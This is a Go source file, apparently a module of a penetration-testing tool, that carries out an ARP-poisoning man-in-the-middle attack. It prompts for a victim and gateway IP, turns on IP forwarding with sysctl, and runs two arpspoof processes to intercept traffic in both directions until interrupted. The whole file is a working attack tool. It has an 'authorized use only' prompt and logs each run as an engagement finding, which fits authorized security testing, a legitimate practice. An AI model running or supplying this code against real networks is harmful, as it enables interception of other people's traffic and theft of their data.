package mitm

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"runtime"
	"strings"
	"syscall"

	"github.com/bryanparreira/davoid/internal/engagement"
	"github.com/bryanparreira/davoid/internal/modules/ui"
)

func Run() error {
	ui.Header("MITM Engine — ARP Poisoning & Traffic Interception")

	// Check requirements
	missing := []string{}
	if _, err := exec.LookPath("arpspoof"); err != nil {
		missing = append(missing, "arpspoof (dsniff package)")
	}
	if len(missing) > 0 {
		ui.Warn("Missing tools: " + strings.Join(missing, ", "))
		ui.Info("Install: brew install dsniff (macOS) | apt install dsniff (Linux)")
		if !ui.Confirm("Continue anyway?") {
			return nil
		}
	}

	ifaces, _ := net.Interfaces()
	var ifaceNames []string
	for _, iface := range ifaces {
		if iface.Flags&net.FlagUp != 0 && iface.Flags&net.FlagLoopback == 0 {
			ifaceNames = append(ifaceNames, fmt.Sprintf("%-12s %s", iface.Name, iface.HardwareAddr))
		}
	}
	if len(ifaceNames) == 0 {
		ui.Fail("No network interfaces found.")
		return nil
	}

	idx := ui.Select("Network Interface", ifaceNames)
	if idx < 0 {
		return nil
	}
	iface := strings.Fields(ifaceNames[idx])[0]

	target := ui.Prompt("Target IP (victim)")
	gateway := ui.Prompt("Gateway IP (router)")

	if target == "" || gateway == "" {
		ui.Fail("Target and gateway required.")
		return nil
	}

	fmt.Println()
	ui.Warn("This will ARP poison the target. Authorized use only.")
	if !ui.Confirm("Launch MITM attack?") {
		return nil
	}

	// Enable IP forwarding
	ui.Info("Enabling IP forwarding...")
	if err := enableIPForwarding(iface); err != nil {
		ui.Warn(fmt.Sprintf("IP forwarding: %v", err))
	} else {
		ui.Success("IP forwarding enabled.")
	}

	fmt.Println()
	ui.Info(fmt.Sprintf("ARP poisoning: %s ↔ %s on %s", target, gateway, iface))
	ui.Info("Press Ctrl+C to stop and restore ARP tables.")
	ui.Divider()

	eng, _ := engagement.Active()
	if eng != nil {
		engagement.LogFinding(eng.ID, "mitm", target,
			fmt.Sprintf("MITM attack launched: %s ↔ %s", target, gateway),
			fmt.Sprintf("Interface: %s", iface), "CRITICAL", "")
	}

	stop := make(chan os.Signal, 1)
	signal.Notify(stop, os.Interrupt, syscall.SIGTERM)

	// Two arpspoof processes: one each direction
	cmd1 := exec.Command("arpspoof", "-i", iface, "-t", target, gateway)
	cmd2 := exec.Command("arpspoof", "-i", iface, "-t", gateway, target)
	cmd1.Stdout = os.Stdout
	cmd1.Stderr = os.Stderr
	cmd2.Stdout = os.Stdout
	cmd2.Stderr = os.Stderr

	cmd1.Start()
	cmd2.Start()

	<-stop

	fmt.Println()
	ui.Info("Stopping ARP poison — restoring tables...")
	if cmd1.Process != nil {
		cmd1.Process.Signal(syscall.SIGTERM)
		cmd1.Wait()
	}
	if cmd2.Process != nil {
		cmd2.Process.Signal(syscall.SIGTERM)
		cmd2.Wait()
	}

	// Restore IP forwarding to original state
	disableIPForwarding(iface)

	ui.Success("ARP tables restored. MITM stopped.")
	ui.PressEnter()
	return nil
}

func enableIPForwarding(iface string) error {
	switch runtime.GOOS {
	case "linux":
		return exec.Command("sysctl", "-w", "net.ipv4.ip_forward=1").Run()
	case "darwin":
		return exec.Command("sysctl", "-w", "net.inet.ip.forwarding=1").Run()
	default:
		return fmt.Errorf("unsupported OS: %s", runtime.GOOS)
	}
}

func disableIPForwarding(_ string) {
	switch runtime.GOOS {
	case "linux":
		exec.Command("sysctl", "-w", "net.ipv4.ip_forward=0").Run()
	case "darwin":
		exec.Command("sysctl", "-w", "net.inet.ip.forwarding=0").Run()
	}
}

func init() {
	// Suppress unused import
	_ = os.Stderr
}
